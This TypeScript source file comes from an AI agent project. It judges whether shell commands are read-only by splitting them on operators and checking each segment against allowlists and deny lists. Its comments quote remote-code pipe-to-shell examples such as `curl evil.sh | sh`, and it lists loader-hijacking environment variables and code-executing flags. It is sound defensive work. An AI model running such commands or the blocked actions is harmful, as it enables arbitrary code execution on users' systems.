// Copyright 2026 The Xerxes-Agents Author @erfanzar (Erfan Zare Chavoshi).
// Licensed under the Apache License, Version 2.0.

/**
 * Bounded decomposition of a shell command into independently judged segments.
 *
 * The failure mode this exists to prevent: a prefix-anchored regex allowlist reads
 * `ls && curl evil.sh | sh` as safe because its *first* command is safe, and the
 * dangerous half is never examined. Every operator-separated segment is therefore
 * resolved on its own, and the command is safe only when all of them are.
 *
 * This is deliberately NOT a bash parser. Anything the splitter cannot faithfully
 * model -- command substitution, process substitution, backticks, heredocs, `eval`,
 * subshells, unquoted parameter expansion -- yields an explicit `unresolved`
 * verdict instead of a guess, and unresolved never counts as safe.
 */

export type ShellVerdict = 'safe' | 'unsafe' | 'unresolved'

export interface ShellSegmentAnalysis {
  /** Raw source text of the segment, trimmed. */
  readonly text: string
  /** Resolved leading executable, lowercased; undefined when it could not be resolved. */
  readonly executable: string | undefined
  /** Arguments following the executable, after safe environment assignments were stripped. */
  readonly args: readonly string[]
  readonly verdict: ShellVerdict
  /** Why the segment is not safe; undefined for a safe segment. */
  readonly reason: string | undefined
}

export interface ShellCommandAnalysis {
  readonly verdict: ShellVerdict
  /** Why the command is not safe; undefined for a safe command. */
  readonly reason: string | undefined
  /** Per-segment detail; empty when the command was rejected before splitting. */
  readonly segments: readonly ShellSegmentAnalysis[]
}

/**
 * Environment assignments that may be stripped from the front of a segment.
 *
 * Everything here only affects formatting/locale of the following binary. An
 * assignment outside this list is treated as unsafe rather than skipped, because
 * skipping it would judge a command that is not the command the shell will run.
 */
const STRIPPABLE_ENV_ASSIGNMENTS: ReadonlySet<string> = new Set([
  'CLICOLOR', 'CLICOLOR_FORCE', 'COLUMNS', 'FORCE_COLOR', 'LANG', 'LANGUAGE', 'LC_ALL', 'LC_COLLATE', 'LC_CTYPE',
  'LC_MESSAGES', 'LC_NUMERIC', 'LC_TIME', 'LINES', 'NO_COLOR', 'TERM', 'TZ',
])

/**
 * Assignments that change what the *following binary actually is* -- loader paths,
 * interpreter startup hooks, shell hooks. These are called out explicitly (rather
 * than merely being absent from the strippable list) so no future edit can widen
 * the safe list into a code-execution primitive by accident.
 */
const EXECUTION_HIJACKING_ENV = [
  'PATH', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT', 'DYLD_', 'PYTHONPATH', 'PYTHONSTARTUP', 'PYTHONHOME',
  'NODE_OPTIONS', 'NODE_PATH', 'BASH_ENV', 'ENV', 'SHELL', 'SHELLOPTS', 'BASH_FUNC_', 'IFS', 'PERL5OPT', 'PERL5LIB',
  'RUBYOPT', 'RUBYLIB', 'GIT_EXEC_PATH', 'GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_PAGER', 'GIT_EXTERNAL_DIFF', 'PAGER',
  'MANPAGER', 'JAVA_TOOL_OPTIONS',
] as const

/** Builtins that execute a command assembled at runtime, so no static verdict is honest. */
const UNRESOLVABLE_BUILTINS: ReadonlySet<string> = new Set(['eval', 'source', '.', 'exec', 'command', 'builtin'])

/** Binaries whose every invocation is read-only regardless of arguments. */
const ALWAYS_READ_ONLY: ReadonlySet<string> = new Set([
  'echo', 'printf', 'pwd', 'whoami', 'hostname', 'id', 'groups', 'locale', 'uptime', 'uname', 'wc', 'which', 'type',
  'df', 'du', 'free', 'basename', 'dirname', 'nproc', 'arch', 'sw_vers', 'true', 'false',
])

/** `--version`-only binaries: their real modes compile, install, or execute code. */
const VERSION_ONLY: ReadonlySet<string> = new Set([
  'node', 'deno', 'ruby', 'rustc', 'java', 'javac', 'gcc', 'clang', 'make', 'tsc', 'perl', 'php',
])

const VERSION_FLAGS: ReadonlySet<string> = new Set(['--version', '-v', '-V', 'version'])

const GIT_READ_ONLY_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'status', 'log', 'diff', 'show', 'branch', 'remote', 'tag', 'stash', 'rev-parse', 'ls-files', 'ls-tree', 'describe',
  'blame', 'shortlog', 'whatchanged', 'diff-tree', 'cat-file', 'name-rev', 'count-objects', 'version',
])

/**
 * Flags accepted nowhere in a git command line. `-c`/`--config-env` can set
 * `core.pager` or an alias and turn `git log` into arbitrary execution; the diff
 * hooks run external programs; `--output` writes a file.
 */
const GIT_FORBIDDEN_FLAGS = [
  '-c', '--config-env', '--exec-path', '--ext-diff', '--textconv', '--output', '--upload-pack', '--receive-pack',
  '--force', '-f',
] as const

/**
 * Flags that turn a read-only git subcommand into a writing one. Scoped per
 * subcommand because the same spelling is harmless elsewhere: `-M` renames a
 * branch but only detects renames in `git diff`.
 */
const GIT_WRITE_FLAGS: ReadonlySet<string> = new Set([
  '-d', '-D', '-m', '-M', '-c', '-C', '-u', '--delete', '--move', '--copy', '--edit-description', '--set-upstream',
  '--set-upstream-to', '--unset-upstream', '--create-reflog',
])

const GH_READ_ONLY_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ['pr', new Set(['list', 'view', 'status', 'diff', 'checks'])],
  ['issue', new Set(['list', 'view', 'status'])],
  ['repo', new Set(['view', 'list'])],
  ['run', new Set(['list', 'view'])],
  ['release', new Set(['list', 'view'])],
  ['workflow', new Set(['list', 'view'])],
  ['auth', new Set(['status'])],
  ['label', new Set(['list'])],
  ['gist', new Set(['list', 'view'])],
])

const DOCKER_READ_ONLY_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string> | 'any'> = new Map<
  string,
  ReadonlySet<string> | 'any'
>([
  ['ps', 'any'],
  ['images', 'any'],
  ['logs', 'any'],
  ['inspect', 'any'],
  ['version', 'any'],
  ['info', 'any'],
  ['stats', 'any'],
  ['top', 'any'],
  ['port', 'any'],
  ['history', 'any'],
  ['diff', 'any'],
  ['image', new Set(['ls', 'inspect', 'history'])],
  ['container', new Set(['ls', 'inspect', 'logs', 'stats', 'top', 'port', 'diff'])],
  ['volume', new Set(['ls', 'inspect'])],
  ['network', new Set(['ls', 'inspect'])],
  ['compose', new Set(['ps', 'config', 'logs', 'images', 'top', 'version'])],
])

const PACKAGE_MANAGER_READ_ONLY: ReadonlySet<string> = new Set([
  'list', 'ls', 'view', 'info', 'show', 'search', 'outdated', 'why', 'ping', 'root', 'prefix', 'bin', 'licenses',
])

const CARGO_READ_ONLY_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'tree', 'metadata', 'search', 'locate-project', 'pkgid', 'verify-project', 'version',
])

const GO_READ_ONLY_SUBCOMMANDS: ReadonlySet<string> = new Set(['list', 'version', 'env', 'doc'])

/**
 * Flags that turn a read-only `go env` into a persistent configuration write:
 * `go env -w VAR=val` and `go env -u VAR` rewrite ~/.config/go/env, surviving
 * long after the command "finishes".
 */
const GO_ENV_WRITE_FLAGS: readonly string[] = ['-w', '-u']

/** `python -m` modules that only print. Anything else can import and run project code. */
const PYTHON_READ_ONLY_MODULES: ReadonlySet<string> = new Set(['json.tool', 'platform', 'site', 'sysconfig', 'this'])

const PIP_READ_ONLY_SUBCOMMANDS: ReadonlySet<string> = new Set(['list', 'show', 'freeze', 'search', 'check', 'config'])

/** Argument prefixes that hand a binary another program to run, or a file to write. */
const FORBIDDEN_ARG_PREFIXES: ReadonlyMap<string, readonly string[]> = new Map([
  ['find', ['-delete', '-exec', '-execdir', '-ok', '-okdir', '-fls', '-fprint', '-fprintf', '-fprint0']],
  ['fd', ['-x', '-X', '--exec', '--exec-batch']],
  ['rg', ['--pre', '--hostname-bin', '--generate']],
  ['ag', ['--pager']],
  ['ack', ['--pager']],
  ['tree', ['-o', '--output']],
  ['file', ['-C', '--compile']],
  ['date', ['-s', '--set']],
])

/** Read-only binaries whose only risk is a handful of program-invoking flags. */
const FLAG_GUARDED_BINARIES: ReadonlySet<string> = new Set([
  'ls', 'cat', 'head', 'tail', 'find', 'fd', 'rg', 'grep', 'egrep', 'fgrep', 'ag', 'ack', 'tree', 'file', 'date',
])

/** Binaries this module knows how to reason about; anything else is unsafe by default. */
const KNOWN_BINARIES: ReadonlySet<string> = new Set([
  ...ALWAYS_READ_ONLY, ...VERSION_ONLY, ...FLAG_GUARDED_BINARIES,
  'cd', 'top', 'git', 'gh', 'docker', 'python', 'python3', 'pip', 'pip3', 'cargo', 'npm', 'pnpm', 'yarn', 'bun', 'go',
])

interface Token {
  readonly value: string
  /** Whether the token contained an unquoted `$` expansion, which decides what actually runs. */
  readonly expanded: boolean
}

interface RawSegment {
  readonly text: string
  readonly tokens: readonly Token[]
}

type SplitResult =
  | { readonly kind: 'ok'; readonly segments: readonly RawSegment[] }
  | { readonly kind: 'unresolved'; readonly reason: string }
  | { readonly kind: 'unsafe'; readonly reason: string }

/** Decompose a shell command and judge every segment independently. */
export function analyzeShellCommand(command: string): ShellCommandAnalysis {
  const split = splitSegments(command)
  if (split.kind !== 'ok') {
    return { verdict: split.kind, reason: split.reason, segments: [] }
  }
  if (split.segments.length === 0) {
    return { verdict: 'unsafe', reason: 'empty command', segments: [] }
  }

  const segments = split.segments.map(analyzeSegment)
  // Composition rule: safe requires *every* segment safe. One unsafe segment makes
  // the command unsafe even when it is preceded by an impeccable read-only prefix.
  const unsafe = segments.find(segment => segment.verdict === 'unsafe')
  if (unsafe) {
    return { verdict: 'unsafe', reason: unsafe.reason, segments }
  }
  const unresolved = segments.find(segment => segment.verdict === 'unresolved')
  if (unresolved) {
    return { verdict: 'unresolved', reason: unresolved.reason, segments }
  }
  return { verdict: 'safe', reason: undefined, segments }
}

/** Convenience predicate: true only when every segment resolved to a read-only invocation. */
export function isReadOnlyShellCommand(command: string): boolean {
  return analyzeShellCommand(command).verdict === 'safe'
}

/**
 * Judge one already-split invocation (an argv pair, no shell syntax involved).
 *
 * Shared with the direct-argv permission path so both surfaces agree on which
 * subcommands and flags are read-only.
 */
export function isReadOnlyInvocation(executable: string, args: readonly string[]): boolean {
  const binary = executable.toLowerCase()
  if (ALWAYS_READ_ONLY.has(binary)) return true
  if (isVersionProbe(args)) return VERSION_ONLY.has(binary) || KNOWN_BINARIES.has(binary)
  if (VERSION_ONLY.has(binary)) return false

  if (FLAG_GUARDED_BINARIES.has(binary)) {
    const forbidden = FORBIDDEN_ARG_PREFIXES.get(binary) ?? []
    return !args.some(argument => forbidden.some(prefix => argument === prefix || argument.startsWith(`${prefix}=`)))
  }
  if (binary === 'cd') return args.filter(argument => argument !== '--').length <= 1
  if (binary === 'top') return args.every(argument => ['-l', '-n', '-b'].includes(argument) || /^\d+$/.test(argument))
  if (binary === 'git') return isReadOnlyGit(args)
  if (binary === 'gh') return isReadOnlyGh(args)
  if (binary === 'docker') return isReadOnlyDocker(args)
  if (binary === 'python' || binary === 'python3') return isReadOnlyPython(args)
  if (binary === 'pip' || binary === 'pip3') return isReadOnlyPip(args)
  if (binary === 'cargo') return CARGO_READ_ONLY_SUBCOMMANDS.has(args[0] ?? '')
  if (binary === 'go') return isReadOnlyGo(args)
  // `bun run`/`bunx`/`npx` execute code, so only the inspection verbs pass.
  if (binary === 'bun') return args[0] === 'pm' ? ['ls', 'bin'].includes(args[1] ?? '') : isPackageQuery(args)
  if (['npm', 'pnpm', 'yarn'].includes(binary)) return isPackageQuery(args)
  return false
}

function isPackageQuery(args: readonly string[]): boolean {
  return PACKAGE_MANAGER_READ_ONLY.has(args[0] ?? '')
}

function isVersionProbe(args: readonly string[]): boolean {
  return args.length === 1 && VERSION_FLAGS.has(args[0] ?? '')
}

function isReadOnlyGit(args: readonly string[]): boolean {
  if (args.length === 0) return true
  if (args.some(argument => GIT_FORBIDDEN_FLAGS.some(flag => argument === flag || argument.startsWith(`${flag}=`)))) {
    return false
  }
  const subcommand = args[0] ?? ''
  if (!GIT_READ_ONLY_SUBCOMMANDS.has(subcommand)) return false
  // `git stash` with no verb pushes a stash; only the listing form is read-only.
  if (subcommand === 'stash') return args[1] === 'list'
  if (subcommand === 'tag') {
    return args.slice(1).every(argument => argument === '-l' || argument === '--list' || argument.startsWith('--list='))
  }
  if (subcommand === 'remote') {
    return args.slice(1).every(argument => argument === '-v' || argument === '--verbose')
  }
  if (subcommand === 'branch') {
    // A bare operand is a branch name to create; a write flag renames or deletes.
    return args.slice(1).every(argument => argument.startsWith('-') && !GIT_WRITE_FLAGS.has(argument))
  }
  return true
}

function isReadOnlyGh(args: readonly string[]): boolean {
  const group = GH_READ_ONLY_SUBCOMMANDS.get(args[0] ?? '')
  return group !== undefined && group.has(args[1] ?? '')
}

function isReadOnlyDocker(args: readonly string[]): boolean {
  const group = DOCKER_READ_ONLY_SUBCOMMANDS.get(args[0] ?? '')
  if (group === undefined) return false
  return group === 'any' || group.has(args[1] ?? '')
}

function isReadOnlyPython(args: readonly string[]): boolean {
  if (args[0] !== '-m') return false
  const module = args[1] ?? ''
  if (PYTHON_READ_ONLY_MODULES.has(module)) return true
  return (module === 'pip' || module === 'pip3') && isReadOnlyPip(args.slice(2))
}

function isReadOnlyPip(args: readonly string[]): boolean {
  const subcommand = args[0] ?? ''
  if (!PIP_READ_ONLY_SUBCOMMANDS.has(subcommand)) return false
  // `pip config set/unset/edit` writes; only the reading verbs stay read-only.
  if (subcommand === 'config') return ['list', 'get', 'debug'].includes(args[1] ?? '')
  return true
}

function isReadOnlyGo(args: readonly string[]): boolean {
  const subcommand = args[0] ?? ''
  if (!GO_READ_ONLY_SUBCOMMANDS.has(subcommand)) return false
  // `go env -w VAR=val` / `go env -u VAR` persistently rewrite ~/.config/go/env,
  // so only the plain read forms (`go env`, `go env GOVAR`) stay read-only --
  // the same treatment the pip config verbs receive above.
  if (subcommand === 'env') {
    return !args.slice(1).some(argument => GO_ENV_WRITE_FLAGS.some(flag => argument === flag || argument.startsWith(flag)))
  }
  return true
}

function analyzeSegment(segment: RawSegment): ShellSegmentAnalysis {
  const base = { text: segment.text, executable: undefined, args: [] as readonly string[] }
  if (segment.tokens.some(token => token.expanded)) {
    // What `$X` expands to decides what runs; a static verdict here would be a guess.
    return { ...base, verdict: 'unresolved', reason: `unquoted expansion in \`${segment.text}\`` }
  }

  let index = 0
  while (index < segment.tokens.length) {
    const token = segment.tokens[index]
    if (token === undefined) break
    const assignment = token.value.match(/^([A-Za-z_][A-Za-z0-9_]*)=/)
    if (!assignment) break
    const name = assignment[1] ?? ''
    if (EXECUTION_HIJACKING_ENV.some(entry => name === entry || name.startsWith(entry))) {
      return { ...base, verdict: 'unsafe', reason: `${name} assignment changes which binary runs` }
    }
    if (!STRIPPABLE_ENV_ASSIGNMENTS.has(name)) {
      return { ...base, verdict: 'unsafe', reason: `unrecognized environment assignment ${name}` }
    }
    index += 1
  }

  const executableToken = segment.tokens[index]
  if (executableToken === undefined) {
    // An assignment-only segment mutates the environment of everything that follows.
    return { ...base, verdict: 'unsafe', reason: `no command in \`${segment.text}\`` }
  }

  const executable = executableToken.value.toLowerCase()
  const args = segment.tokens.slice(index + 1).map(token => token.value)
  const resolved = { text: segment.text, executable, args }
  if (UNRESOLVABLE_BUILTINS.has(executable)) {
    return { ...resolved, verdict: 'unresolved', reason: `\`${executable}\` runs a command built at runtime` }
  }
  if (executable.includes('/')) {
    // A path-qualified binary is not the allowlisted one: `./ls` is whatever the repo ships.
    return { ...resolved, verdict: 'unsafe', reason: `path-qualified executable \`${executableToken.value}\`` }
  }
  if (!isReadOnlyInvocation(executable, args)) {
    return { ...resolved, verdict: 'unsafe', reason: `\`${segment.text}\` is not a known read-only invocation` }
  }
  return { ...resolved, verdict: 'safe', reason: undefined }
}

/**
 * Split on the operators that sequence independent commands, honouring quoting.
 *
 * `&` (background) counts as a separator too: without it `cat & curl x | sh` would
 * present as the single safe command `cat`.
 */
function splitSegments(command: string): SplitResult {
  const segments: RawSegment[] = []
  let tokens: Token[] = []
  let segmentStart = 0
  let tokenValue = ''
  let tokenStarted = false
  let tokenExpanded = false
  let index = 0

  const endToken = (): void => {
    if (tokenStarted) tokens.push({ value: tokenValue, expanded: tokenExpanded })
    tokenValue = ''
    tokenStarted = false
    tokenExpanded = false
  }
  const endSegment = (end: number): void => {
    endToken()
    if (tokens.length > 0) segments.push({ text: command.slice(segmentStart, end).trim(), tokens })
    tokens = []
  }

  while (index < command.length) {
    const char = command[index] ?? ''

    if (char === '\'') {
      const close = command.indexOf('\'', index + 1)
      if (close < 0) return { kind: 'unresolved', reason: 'unterminated single quote' }
      tokenStarted = true
      tokenValue += command.slice(index + 1, close)
      index = close + 1
      continue
    }

    if (char === '"') {
      const scanned = scanDoubleQuoted(command, index)
      if (scanned.kind !== 'ok') return scanned
      tokenStarted = true
      tokenValue += scanned.value
      tokenExpanded = tokenExpanded || scanned.expanded
      index = scanned.next
      continue
    }

    if (char === '\\') {
      const next = command[index + 1]
      if (next === undefined) return { kind: 'unresolved', reason: 'trailing backslash' }
      if (next !== '\n') {
        tokenStarted = true
        tokenValue += next
      }
      index += 2
      continue
    }

    if (char === '`') return { kind: 'unresolved', reason: 'backtick command substitution' }
    if (char === '(' || char === ')') return { kind: 'unresolved', reason: 'subshell or substitution grouping' }

    if (char === '$') {
      if (command[index + 1] === '(') return { kind: 'unresolved', reason: 'command substitution' }
      tokenStarted = true
      tokenExpanded = true
      tokenValue += char
      index += 1
      continue
    }

    if (char === '<' || char === '>') {
      if (command[index + 1] === '(') return { kind: 'unresolved', reason: 'process substitution' }
      if (char === '<' && command[index + 1] === '<') return { kind: 'unresolved', reason: 'heredoc' }
      return { kind: 'unsafe', reason: 'redirection' }
    }

    if (char === '\n' || char === ';') {
      endSegment(index)
      index += 1
      segmentStart = index
      continue
    }

    if (char === '&') {
      if (command[index + 1] === '>') return { kind: 'unsafe', reason: 'redirection' }
      endSegment(index)
      index += command[index + 1] === '&' ? 2 : 1
      segmentStart = index
      continue
    }

    if (char === '|') {
      endSegment(index)
      index += command[index + 1] === '|' || command[index + 1] === '&' ? 2 : 1
      segmentStart = index
      continue
    }

    if (char === ' ' || char === '\t' || char === '\r') {
      endToken()
      index += 1
      continue
    }

    tokenStarted = true
    tokenValue += char
    index += 1
  }

  endSegment(command.length)
  return { kind: 'ok', segments }
}

type DoubleQuoteScan =
  | { readonly kind: 'ok'; readonly value: string; readonly expanded: boolean; readonly next: number }
  | { readonly kind: 'unresolved'; readonly reason: string }

/**
 * Consume a double-quoted run.
 *
 * Double quotes suppress word splitting and globbing but NOT substitution, so
 * `$(...)` and backticks inside them still execute and stay unresolved.
 */
function scanDoubleQuoted(command: string, start: number): DoubleQuoteScan {
  let value = ''
  let expanded = false
  let index = start + 1
  while (index < command.length) {
    const char = command[index] ?? ''
    if (char === '"') return { kind: 'ok', value, expanded, next: index + 1 }
    if (char === '\\') {
      const next = command[index + 1]
      if (next === undefined) return { kind: 'unresolved', reason: 'trailing backslash' }
      value += next
      index += 2
      continue
    }
    if (char === '`') return { kind: 'unresolved', reason: 'backtick command substitution' }
    if (char === '$') {
      if (command[index + 1] === '(') return { kind: 'unresolved', reason: 'command substitution' }
      expanded = true
    }
    value += char
    index += 1
  }
  return { kind: 'unresolved', reason: 'unterminated double quote' }
}
